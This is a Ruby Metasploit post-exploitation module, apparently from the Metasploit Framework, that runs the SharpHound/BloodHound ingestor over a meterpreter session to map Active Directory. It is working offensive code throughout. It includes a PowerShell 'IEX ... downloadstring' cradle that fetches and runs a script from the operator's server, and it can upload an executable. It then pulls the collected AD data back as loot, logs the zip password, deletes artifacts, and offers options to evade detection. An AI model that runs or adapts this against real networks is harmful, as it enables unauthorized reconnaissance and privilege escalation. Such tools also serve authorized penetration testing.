class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BloodHound Ingestor',
        'Description' => %q{
          This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more.
          With this information BloodHound will easily identify highly complex attack paths that would otherwise be impossible to quickly
          identify within an Active Directory environment.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h4ng3r <h4ng3r@computerpirate.me>',
          'h00die'
        ],
        'References' => [ 'URL', 'https://github.com/BloodHoundAD/BloodHound/' ],
        'Platform' => [ 'win' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'AKA' => ['sharphound'],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('CollectionMethod', [true, 'The collection method to use. This parameter accepts a comma separated list of values. Accepted values are Default, Group, LocalAdmin, RDP, DCOM, GPOLocalGroup, Session, ObjectProps, ComputerOnly, LoggedOn, Trusts, ACL, Container, DcOnly, All', 'Default']),
      OptString.new('Domain', [false, 'Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies']),
      OptBool.new('Stealth', [true, 'Use stealth collection options, will sacrifice data quality in favor of much reduced network impact', false]),
      OptBool.new('ExcludeDomainControllers', [true, 'Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior', false]),
      OptString.new('DomainController', [false, 'Specify which Domain Controller to request data from. Defaults to closest DC using Site Names']),
      OptInt.new('LdapPort', [false, 'Override the port used to connect to LDAP']),
      OptBool.new('SecureLdap', [false, 'Uses LDAPs instead of unencrypted LDAP on port 636']),
      # these were never implemented
      # OptString.new('LDAPUsername', [false, 'User to connect to LDAP with', 'Default']),
      # OptString.new('LDAPPassword', [false, 'Password for user you are connecting to LDAP with']),
      OptString.new('DisableKerbSigning', [false, 'Disables Kerberos Signing on requests', false]),
      OptPath.new('OutputDirectory', [false, 'Folder to write json output to.  Default is Windows temp']),
      OptEnum.new('Method', [true, 'Method to run Sharphound with', 'download', ['download', 'disk']]),
      OptBool.new('EncryptZip', [false, 'If the zip should be password protected', true]),
      OptBool.new('NoSaveCache', [false, 'Dont save the cache file to disk', true]),
      OptString.new('ZipFileName', [false, 'Zip Output File Name.  Blank for random', '']),
    ])
  end

  # Options removed or changed in sharphound v2 to sharphound v3
  # Removed:
  # SearchForest
  # OU
  # IgnoreLdapCert
  # Threads
  # PingTimeout
  # SkipPing
  # LoopDelay
  # MaxLoopTime
  # SkipGCDeconfliction

  # Renamed:
  # ExcludeDc -> ExcludeDomainControllers
  # LDAPUser -> LDAPUsername
  # LDAPPass -> LDAPPassword
  # JSONFolder -> OutputDirectory

  def sharphound_ps1
    File.join(Msf::Config.data_directory, 'post', 'powershell', 'SharpHound.ps1')
  end

  def sharphound_exe
    File.join(Msf::Config.data_directory, 'post', 'SharpHound.exe')
  end

  def on_request_uri(cli, _request)
    base_script = File.read(sharphound_ps1)
    send_response(cli, base_script)
  end

  def download_run
    start_service
    uri = get_uri
    "IEX (new-object net.webclient).downloadstring('#{uri}')"
  end

  def disk_run
    name = "#{pwd}\\#{Rex::Text.rand_text_alpha_lower(4..10)}.exe"
    vprint_status "Uploading sharphound.exe as #{name}"
    upload_file(name, sharphound_exe)
    return ". #{name}"
  end

  def run
    if !have_powershell?
      fail_with(Failure::Unknown, 'PowerShell is not installed')
    end

    extra_params = ''
    if datastore['Domain']
      extra_params += "-Domain #{datastore['Domain']} "
    end

    if datastore['Stealth']
      extra_params += '-Stealth '
    end
    if datastore['SkipGCDeconfliction']
      extra_params += '-SkipGCDeconfliction '
    end
    if datastore['ExcludeDomainControllers']
      extra_params += '-ExcludeDomainControllers '
    end
    if datastore['DomainController']
      extra_params += "-DomainController #{datastore['DomainController']} "
    end
    if datastore['LdapPort']
      extra_params += "-LdapPort #{datastore['LdapPort']} "
    end
    if datastore['SecureLdap']
      extra_params += '-SecureLdap '
    end
    if datastore['EncryptZip']
      extra_params += '-EncryptZip '
    end
    if datastore['NoSaveCache']
      extra_params += '-NoSaveCache '
    end

    # these options are only added if they aren't the sharphound default
    unless datastore['CollectionMethod'] == 'Default'
      extra_params += "-CollectionMethod #{datastore['CollectionMethod']}"
    end
    tmp_path = datastore['OutputDirectory'] || get_env('TEMP')

    zip_name = datastore['ZipFileName'].empty? ? Rex::Text.rand_text_alpha_lower(4..10) : datastore['ZipFileName']

    if datastore['Method'] == 'download'
      command = download_run
      invoker = "Invoke-BloodHound -OutputDirectory \"#{tmp_path}\" -ZipFileName #{zip_name} #{extra_params}"
    elsif datastore['Method'] == 'disk'
      command = disk_run
      exe = command.sub('. ', '') # so we get the filename again
      # for exe, we move invoker into command to run more friendly
      invoker = ''
      command = "#{command} -OutputDirectory \"#{tmp_path}\" -ZipFileName #{zip_name} #{extra_params}"
      command.gsub!('-', '--')
      command.gsub!(/(--[a-zA-Z]+ )/, &:downcase) # exe only uses downcase
    end

    print_status("Loading BloodHound with: #{command}")
    print_status("Invoking BloodHound with: #{invoker}") unless invoker.empty?
    process, _pid, _c = execute_script("#{command}; #{invoker}")

    while (line = process.channel.read)
      line.split("\n").map { |s| print_status(s) }
      m = line.match(/Compressing data to (.*\.zip)/)
      sleep 30 # a final wait just in case we caught the text prior to the zip happening
      next unless m

      zip_path = m[1]
      p = store_loot('windows.ad.bloodhound', 'application/zip', session, read_file(zip_path), File.basename(zip_path))
      print_good("Downloaded #{zip_path}: #{p}")
      rm_f(zip_path)
      # the line *after* 'Compressing data to...' is the zip password.
      if datastore['EncryptZip']
        zip_pass = nil
        # older versions or powershell may have 2 spaces, exe v3 has 1
        unless /Password for Zip file is (?<zip_pass>.*)\./ =~ line
          # try one last time incase we hit right after the zip statement, but before the password statement
          /Password for Zip file is (?<zip_pass>.*)\./ =~ process.channel.read

        end
        print_good "Zip password: #{zip_pass}"
        report_note(host: session,
                    data: "Bloodhound/Sharphound loot #{p} password is #{zip_pass}",
                    type: 'Sharphound Zip Password')
      end
      break
    end

    if datastore['Method'] == 'disk'
      vprint_status "Deleting #{exe}"
      rm_f exe
    end
  end

end
